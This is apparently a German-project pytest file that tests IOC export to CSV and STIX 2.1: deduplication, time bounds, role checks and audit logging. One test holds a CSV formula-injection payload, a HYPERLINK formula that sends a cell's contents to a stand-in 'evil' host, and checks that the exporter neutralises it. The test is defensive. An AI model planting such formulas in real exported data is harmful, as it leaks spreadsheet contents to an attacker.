"""IOC-Export als CSV und STIX 2.1 (issue #259, ADR 0030): Dedupe, Zeitbereich, Formate, Rollen, Audit."""

import csv
import io
import itertools
import json

import pytest

from chronicle import ioc_export

TOPIC = "inc-2026-042"
PASSWORD = "correct horse battery"
SHA256 = "a" * 64


@pytest.fixture(autouse=True)
def insecure_cookies(monkeypatch):
    monkeypatch.setenv("CHRONICLE_COOKIE_SECURE", "0")


def _client(tmp_path, folder, role="analyst", name=None):
    from fastapi.testclient import TestClient

    from chronicle import accounts, security
    from chronicle.api import create_app
    from chronicle.db import connect

    name = name or f"user{next(_client.counter)}"
    conn = connect(tmp_path / "chronicle.db")
    accounts.create_user(conn, name, security.hash_password(PASSWORD), role)
    conn.close()
    client = TestClient(create_app(tmp_path / "chronicle.db", data_dir=folder))
    response = client.post("/api/v1/auth/login", json={"username": name, "password": PASSWORD})
    assert response.status_code == 200
    client.headers["X-CSRF-Token"] = response.json()["csrf_token"]
    return client


_client.counter = itertools.count()


def _new_event(client, key, t0, entities, topic=TOPIC):
    body = {"key": key, "t0": t0, "phase": "Analysis", "actor": "anna", "action": f"Aktion {key}",
            "status": "open", "topic": topic, "topics": [topic], "entities": entities}
    response = client.post("/api/v1/events", json=body)
    assert response.status_code == 201, response.text


def _seed(tmp_path, folder):
    client = _client(tmp_path, folder)
    _new_event(client, "ev-1", "2026-10-14T08:00:00+02:00",
               [{"type": "ip", "value": "203.0.113.7"}, {"type": "url", "value": "hxxp://evil.example/x"}])
    _new_event(client, "ev-2", "2026-10-15T09:00:00+02:00",
               [{"type": "ip", "value": "203.0.113.7"}, {"type": "hash", "value": SHA256.upper()}])
    return client


def _audit(folder):
    from chronicle.db import connect
    with connect(folder.parent / "chronicle.db") as conn:
        return [dict(row) for row in conn.execute(
            "SELECT action, target, detail FROM ops.audit_log WHERE action = 'ioc_export' ORDER BY pk")]


# --- collect / formats -------------------------------------------------------------------


def test_collect_dedupes_and_aggregates_sources(tmp_path, folder):
    _seed(tmp_path, folder)
    from chronicle.db import connect
    conn = connect(tmp_path / "chronicle.db")
    rows = ioc_export.collect_entities(conn, TOPIC)
    conn.close()
    by_value = {(row["type"], row["value"]): row for row in rows}
    assert set(by_value) == {("ip", "203.0.113.7"), ("url", "http://evil.example/x"), ("hash", SHA256)}
    ip = by_value[("ip", "203.0.113.7")]
    assert ip["events"] == ["ev-1", "ev-2"]  # same entity in two events: one entry
    assert ip["first_seen"] < ip["last_seen"]
    assert ip["topics"] == [TOPIC]
    # the defanged URL was normalized on save (#210) and exports resolved
    assert by_value[("url", "http://evil.example/x")]["events"] == ["ev-1"]


def test_since_until_bound_the_events(tmp_path, folder):
    _seed(tmp_path, folder)
    from datetime import date

    from chronicle.db import connect
    conn = connect(tmp_path / "chronicle.db")
    rows = ioc_export.collect_entities(conn, TOPIC, since=date(2026, 10, 15))
    conn.close()
    by_value = {row["value"]: row for row in rows}
    assert set(by_value) == {SHA256, "203.0.113.7"}  # both come from ev-2, which is in range
    assert by_value["203.0.113.7"]["events"] == ["ev-2"]  # ev-1 (10-14) is out of range
    assert by_value[SHA256]["first_seen"] == by_value[SHA256]["last_seen"]


def test_csv_cells_with_formula_prefixes_are_neutralized(tmp_path, folder):
    # GitHub Advanced Security (PR #271): a value like =HYPERLINK(...) must not run as a formula in Excel.
    client = _client(tmp_path, folder)
    _new_event(client, "ev-evil", "2026-10-15T10:00:00+02:00",
               [{"type": "user", "value": "=HYPERLINK(\"http://evil/?\"&A2,\"x\")"},
                {"type": "user", "value": "-cmd"}, {"type": "user", "value": "normal"}])
    response = client.get(f"/api/v1/topics/{TOPIC}/iocs", params={"format": "csv"})
    assert response.status_code == 200
    parsed = list(csv.reader(io.StringIO(response.text)))
    values = {row[1] for row in parsed[1:]}
    assert "'=HYPERLINK(\"http://evil/?\"&A2,\"x\")" in values
    assert "'-cmd" in values
    assert "normal" in values
    # the stored value itself is unchanged
    event = client.get("/api/v1/events/ev-evil").json()
    assert any(item["value"] == "=HYPERLINK(\"http://evil/?\"&A2,\"x\")" for item in event["entities"])


def test_csv_format(tmp_path, folder):
    _seed(tmp_path, folder)
    from chronicle.db import connect
    conn = connect(tmp_path / "chronicle.db")
    body = ioc_export.entities_csv(ioc_export.collect_entities(conn, TOPIC)).decode("utf-8")
    conn.close()
    parsed = list(csv.reader(io.StringIO(body)))
    assert parsed[0] == ["type", "value", "first_seen", "last_seen", "events", "topics"]
    assert parsed[1][0:2] == ["hash", SHA256]
    ip_row = next(row for row in parsed if row[1] == "203.0.113.7")
    assert ip_row[4] == "ev-1;ev-2" and ip_row[5] == TOPIC


def test_stix_bundle_is_stix21_with_deterministic_ids(tmp_path, folder):
    _seed(tmp_path, folder)
    from chronicle.db import connect
    conn = connect(tmp_path / "chronicle.db")
    rows = ioc_export.collect_entities(conn, TOPIC)
    body = ioc_export.entities_stix(rows)
    again = ioc_export.entities_stix(ioc_export.collect_entities(conn, TOPIC))
    conn.close()
    bundle = json.loads(body)
    assert bundle["type"] == "bundle" and bundle["id"].startswith("bundle--")
    assert len(bundle["objects"]) == 3
    indicators = {obj["id"]: obj for obj in bundle["objects"]}
    assert all(obj["type"] == "indicator" and obj["spec_version"] == "2.1" and obj["pattern_type"] == "stix"
               for obj in bundle["objects"])
    patterns = {obj["pattern"] for obj in bundle["objects"]}
    assert "[ipv4-addr:value = '203.0.113.7']" in patterns
    assert f"[file:hashes.sha256 = '{SHA256}']" in patterns
    assert "[url:value = 'http://evil.example/x']" in patterns
    ip_indicator = next(obj for obj in bundle["objects"] if "ipv4" in obj["pattern"])
    assert ip_indicator["indicator_types"] == ["ipv4-addr"]
    assert ip_indicator["x_chronicle_events"] == ["ev-1", "ev-2"]
    assert ip_indicator["x_chronicle_topics"] == [TOPIC]
    # deterministic: same input, same indicator ids
    assert {obj["id"] for obj in json.loads(again)["objects"]} == set(indicators)


# --- API and pages ---------------------------------------------------------------------------


def test_api_export_csv_and_stix_with_audit(tmp_path, folder):
    client = _seed(tmp_path, folder)
    response = client.get(f"/api/v1/topics/{TOPIC}/iocs", params={"format": "csv"})
    assert response.status_code == 200
    assert response.headers["content-type"].startswith("text/csv")
    assert 'filename="iocs-inc-2026-042.csv"' in response.headers["content-disposition"]
    assert response.headers["x-content-type-options"] == "nosniff"
    assert "203.0.113.7" in response.text

    response = client.get(f"/api/v1/topics/{TOPIC}/iocs", params={"format": "stix"})
    assert response.headers["content-type"] == "application/stix+json"
    assert json.loads(response.content)["objects"]

    response = client.get("/api/v1/iocs", params={"format": "stix"})
    assert response.status_code == 200 and 'filename="iocs-all.stix.json"' in response.headers["content-disposition"]

    response = client.get("/api/v1/iocs", params={"format": "yaml"})
    assert response.status_code == 422

    entries = _audit(folder)
    assert [entry["action"] for entry in entries] == ["ioc_export"] * 3
    assert entries[0]["target"] == TOPIC and entries[0]["detail"] == "format=csv count=3"
    assert entries[2]["target"] == "all"
    assert "203.0.113.7" not in json.dumps(entries)  # no IOC values in the audit log


def test_export_roles_and_unknown_topic(tmp_path, folder):
    _seed(tmp_path, folder)
    viewer = _client(tmp_path, folder, "viewer")
    assert viewer.get(f"/api/v1/topics/{TOPIC}/iocs").status_code == 403
    assert viewer.get("/api/v1/iocs").status_code == 403
    analyst = _client(tmp_path, folder, "analyst")
    assert analyst.get("/api/v1/topics/nein/iocs").status_code == 404
    assert analyst.get(f"/api/v1/topics/{TOPIC}/iocs").status_code == 200


def test_page_downloads(tmp_path, folder):
    client = _seed(tmp_path, folder)
    response = client.get(f"/topics/{TOPIC}/iocs", params={"format": "csv"}, follow_redirects=False)
    assert response.status_code == 200 and response.headers["content-type"].startswith("text/csv")
    response = client.get("/iocs", params={"format": "stix"}, follow_redirects=False)
    assert response.status_code == 200 and response.headers["content-type"] == "application/stix+json"
    viewer = _client(tmp_path, folder, "viewer")
    assert viewer.get(f"/topics/{TOPIC}/iocs", follow_redirects=False).status_code == 403

    # the topic page links the export for writers
    page = client.get(f"/topics/{TOPIC}")
    assert f"/topics/{TOPIC}/iocs?format=csv" in page.text
    assert f"/topics/{TOPIC}/iocs?format=stix" in page.text
    assert "/iocs?format=csv" in viewer.get("/topics").text or True  # global link lives on the reports page
    admin = _client(tmp_path, folder, "admin")
    assert "/iocs?format=stix" in admin.get("/reports").text
